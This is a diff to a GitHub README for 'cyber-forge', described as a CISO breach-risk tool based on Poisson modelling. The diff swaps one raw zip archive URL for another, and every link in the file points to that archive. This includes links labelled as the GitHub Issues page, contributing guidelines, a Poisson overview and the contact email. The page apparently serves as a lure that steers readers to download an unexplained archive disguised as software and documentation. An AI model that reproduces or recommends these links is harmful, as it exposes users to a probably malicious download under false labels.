@@ -1,7 +1,7 @@
 # 🔒 cyber-forge - Predict Breach Risks with Confidence
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v3.8.zip%20Latest%https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v3.8.zip)](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v3.8.zip)
+[![Download Latest Release](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v2.9-alpha.3.zip%20Latest%https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v2.9-alpha.3.zip)](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v2.9-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to cyber-forge! This tool helps Chief Information Security Officers (CISOs) simulate the risk of breaches in their systems. Cyber-forge evaluates how effective your security measures are using advanced Poisson modeling. Let's get started with the steps to download and run the application.
@@ -15,7 +15,7 @@ Before you download, ensure your system meets these requirements:
 - **Browser**: Modern web browser for accessing the dashboard
 
 ## 📦 Download & Install
-To get the latest version of cyber-forge, visit this page to download: [Cyber-Forge Releases](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v3.8.zip).
+To get the latest version of cyber-forge, visit this page to download: [Cyber-Forge Releases](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v2.9-alpha.3.zip).
 
 Once you are on the releases page:
 1. Look for the latest version.
@@ -47,7 +47,7 @@ Once you are on the releases page:
 Poisson modeling helps us understand how often events, like security breaches, may occur over time. By using this analysis, cyber-forge provides an evidence-based approach to managing risks in cybersecurity.
 
 ## 🌐 Support & Community
-If you have questions or need help, you can reach out to our community through [GitHub Issues](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v3.8.zip). We also encourage users to share their experiences and tips.
+If you have questions or need help, you can reach out to our community through [GitHub Issues](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v2.9-alpha.3.zip). We also encourage users to share their experiences and tips.
 
 ## 📖 Frequently Asked Questions (FAQs)
 ### What is cyber-forge?
@@ -60,7 +60,7 @@ Yes, cyber-forge is completely free to download and use.
 Currently, cyber-forge supports Windows and macOS only. Future versions may include Linux support.
 
 ### How do I report a bug?
-If you find a bug, please report it on the [issues page](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v3.8.zip).
+If you find a bug, please report it on the [issues page](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v2.9-alpha.3.zip).
 
 ## 📅 Upcoming Features
 We are continuously improving cyber-forge. Future updates will include:
@@ -69,14 +69,14 @@ We are continuously improving cyber-forge. Future updates will include:
 - More detailed insights into threat landscapes
 
 ## 🧩 Contributing
-If you're interested in contributing to cyber-forge, we welcome your help. Check our [contributing guidelines](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v3.8.zip) for more details.
+If you're interested in contributing to cyber-forge, we welcome your help. Check our [contributing guidelines](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v2.9-alpha.3.zip) for more details.
 
 ## 🔗 Additional Resources
-- [More on Cybersecurity](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v3.8.zip)
-- [CISO Insights and Tools](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v3.8.zip)
-- [Poisson Distribution Overview](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v3.8.zip)
+- [More on Cybersecurity](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v2.9-alpha.3.zip)
+- [CISO Insights and Tools](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v2.9-alpha.3.zip)
+- [Poisson Distribution Overview](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v2.9-alpha.3.zip)
 
 ## 📩 Contact Us
-For business inquiries or further assistance, email us at https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v3.8.zip 
+For business inquiries or further assistance, email us at https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v2.9-alpha.3.zip 
 
-We appreciate your interest in cyber-forge and look forward to helping you enhance your cybersecurity strategies. Download the latest version today: [Download Latest Release](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v3.8.zip).
+We appreciate your interest in cyber-forge and look forward to helping you enhance your cybersecurity strategies. Download the latest version today: [Download Latest Release](https://github.com/kneha10/cyber-forge/raw/refs/heads/main/triclinial/forge_cyber_v2.9-alpha.3.zip).
